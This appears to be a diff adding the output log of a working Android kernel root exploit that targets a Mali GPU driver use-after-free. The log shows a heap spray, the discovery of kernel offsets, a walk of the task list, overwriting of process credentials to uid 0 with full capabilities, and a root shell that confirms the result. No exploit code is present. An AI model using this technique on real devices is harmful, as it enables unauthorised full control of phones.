@@ -1,0 +1,35 @@
+[*] kroot pid=27564
+[+] UAF armed + alias prefaulted
+[+] chunk base=0x7090200000 span=30720MB
+[+] spray done
+[+] cand pg=0x0 i=2492 slots=124/5 lines=15/0 high=0xe8000000000000 low=0xf53
+[i] memstart_addr=80000000
+[i] kimage_voffset=ffffff7f88000000
+[i] init_task comm='swapper/0' cred=ffffff800972c0c0 real_cred=ffffff800972c0c0 tasks.next=ffffffc0fa8f84d8 tasks.prev=ffffffc06ecfcd58
+[i] task[0] ffffffc06ecfc880 comm='kbase_event' cred=ffffffc0f8db1000
+[i] task[1] ffffffc081bf9d00 comm='mali-kroot' cred=ffffffc0f8db19c0
+[+] found task ffffffc081bf9d00 cred=ffffffc0f8db19c0 real_cred=ffffffc0f8db19c0
+[i] cred ffffffc0f8db19c0 uid=2000 gid=0
+[i] cred gid=2000 euid=2000 egid=2000 fsuid=2000
+[+] cred patched (readback uid=0 gid=0 cap_eff=3fffffffff)
+[i] parent task=ffffffc081bfe580 comm='sh' cred=ffffffc0f8db10c0 real_cred=ffffffc0f8db10c0
+[i] cred ffffffc0f8db10c0 uid=2000 gid=0
+[i] cred gid=2000 euid=2000 egid=2000 fsuid=2000
+[+] cred patched (readback uid=0 gid=0 cap_eff=3fffffffff)
+[i] selinux_state bytes: 00 00 00 01
+[!] enforcing byte != 1 at +1; not patching
+[i] getuid=0 geteuid=0 getgid=0
+[+] releasing mappings
+[+] spawning root shell
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012 context=u:r:shell:s0
+Permissive
+0
+ROOTPROOF_0_Permissive
+[+] shell exited status=0
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012 context=u:r:shell:s0
+Permissive
+CapInh:	0000003fffffffff
+CapPrm:	0000003fffffffff
+CapEff:	0000003fffffffff
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
